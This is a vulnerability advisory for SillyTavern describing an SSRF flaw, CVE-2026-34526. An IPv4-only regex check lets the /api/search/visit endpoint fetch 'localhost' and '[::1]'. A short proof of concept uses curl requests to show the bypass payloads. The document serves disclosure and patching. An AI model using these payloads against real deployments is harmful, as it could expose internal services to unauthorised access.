# [M] SillyTavern: Incomplete IP validation in /api/search/visit allows SSRF via localhost and IPv6

## Summary
Severity: Medium
Advisory: GHSA-wm7j-m6jm-8797
CVE: CVE-2026-34526
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-wm7j-m6jm-8797
Type: github-advisory

## Affected
- npm: `sillytavern` — affected >=0 <1.17.0

## Details
### Details
Distinct from CVE-2025-59159 and CVE-2026-26286 (all fixed in v1.16.0). This endpoint is still unpatched.

In `src/endpoints/search.js` line 419, the hostname is checked against `/^\d+\.\d+\.\d+\.\d+$/`. This only matches literal dotted-quad IPv4 (e.g. `127.0.0.1`, `10.0.0.1`). It does not catch:
- `localhost` (hostname, not dotted-quad)
- `[::1]` (IPv6 loopback)
- DNS names resolving to internal addresses (e.g. `localtest.me` -> 127.0.0.1)

A separate port check (`urlObj.port !== ''`) limits exploitation to services on default ports (80/443), making this lower severity than a fully unrestricted SSRF.

### PoC
1. Start SillyTavern v1.16.0 normally
2. Send requests to compare blocked vs bypassed (requires a valid session cookie or CSRF disabled):
```bash
# Blocked — dotted-quad matched by regex
curl -s -o /dev/null -w "%{http_code}" -X POST http://127.0.0.1:8000/api/search/visit \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1/", "html": true}'
# Returns: 400 (blocked)

# Bypassed — "localhost" is not dotted-quad
curl -s -o /dev/null -w "%{http_code}" -X POST http://127.0.0.1:8000/api/search/visit \
  -H "Content-Type: application/json" \
  -d '{"url": "http://localhost/", "html": true}'
# Returns: 500 (passed validation, fetch attempted, ECONNREFUSED because nothing on port 80)

# Bypassed — IPv6 loopback is not dotted-quad
curl -s -o /dev/null -w "%{http_code}" -X POST http://127.0.0.1:8000/api/search/visit \
  -H "Content-Type: application/json" \
  -d '{"url": "http://[::1]/", "html": true}'
# Returns: 500 (passed validation, fetch attempted)
```

The 400 vs 500 difference confirms `localhost` and `[::1]` pass the IP check. The 500 is ECONNREFUSED (nothing listening on port 80), not a validation rejection.

### Impact
Server-side request forgery with partial restrictions. An authenticated user can force the server to fetch from internal hosts on default ports (80/443) using hostnames or IPv6 addresses that bypass the IP check. The full response body is returned. Lower severity than a fully unrestricted SSRF due to the port limitation.

## Resolution

The issue was addressed in version 1.17.0 by improving IPv6 address validation

## References
- https://github.com/SillyTavern/SillyTavern/security/advisories/GHSA-wm7j-m6jm-8797
- https://nvd.nist.gov/vuln/detail/CVE-2026-34526
- https://github.com/SillyTavern/SillyTavern
- https://github.com/SillyTavern/SillyTavern/releases/tag/1.17.0
